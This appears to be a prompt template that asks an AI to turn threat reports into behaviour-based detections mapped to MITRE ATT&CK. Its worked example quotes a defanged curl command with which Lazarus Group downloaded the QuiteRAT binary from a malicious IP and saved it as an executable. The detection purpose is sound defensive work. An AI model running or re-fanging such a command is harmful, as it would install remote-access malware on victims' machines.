You are responsible for analyzing a threat report to identify detection opportunity requirements.
Analyze the REPORT provided below and perform the following tasks:
  - Identify threat detection opportunities that can be used across endpoint, network, cloud, web, and/or application logs
  - Detections MUST focus on threat actor, malware, or tool behaviors
  - Do NOT create detections for specific IOCs such as hostnames, IP addresses, or file hashes
  - Provide a MITRE ATT&CK TTP ID and name for each detection
  - Provide a brief description of the detection and the log sources required for the detection logic
  - Provide an example of the behavior being detected if that context is available in the REPORT
  - Add new lines and a separator between each detection

Example
-------
example report snippet:
```
We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:

curl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe
```

example detections:
```
* Detection: Curl Download of QuiteRAT
* MITRE ATT&CK TTP ID: T1105
* MITRE ATT&CK TTP Name: Ingress Tool Transfer
* Log Sources: Endpoint
* Example: `curl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe`

* MITRE ATT&CK TTP ID: ...
